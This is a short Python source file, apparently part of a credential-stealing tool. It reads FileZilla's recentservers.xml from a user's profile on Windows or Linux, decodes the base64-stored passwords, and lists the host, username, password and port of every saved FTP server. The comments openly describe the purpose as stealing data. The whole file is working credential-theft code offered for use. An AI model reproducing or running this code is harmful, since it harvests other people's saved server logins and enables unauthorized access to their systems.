import platform
import os
import xml.etree.ElementTree as xml
from base64 import b64decode as d64
	
def steal():
	# Set the path for Windows
	if platform.system() == "Windows":
		path = os.getenv("APPDATA") + "\\FileZilla\\recentservers.xml"
	elif platform.system() == "Linux":
		path = os.getenv("HOME") + "/.filezilla/recentservers.xml"
	# Print the notice
	else:
		return "[-] Mac OSX is not supported"
	# Steal the data
	return _steal_(path)
	
def _steal_(path):
	ret = list()
	try:
		# Parse the XML
		root = xml.parse(path).getroot()[0]
	except:
		# File is not found
		return "[-] recentservers.xml not found"
	# Enumerate accounts
	for srv in root:
		# Check if the password is blank (even better for us)
		if srv[5].text == None:
			password = "(None)"
		else:
		# Decode the base64-ed password
			password = d64(srv[5].text)
		ret.append("[+] Host: {host}\n    Username: {user}\n    Password: {pw}\n    Port: {port}\n".format(host=srv[0].text,
														   user=srv[4].text,
                                									           pw=password,
														   port=srv[1].text))
	return ret
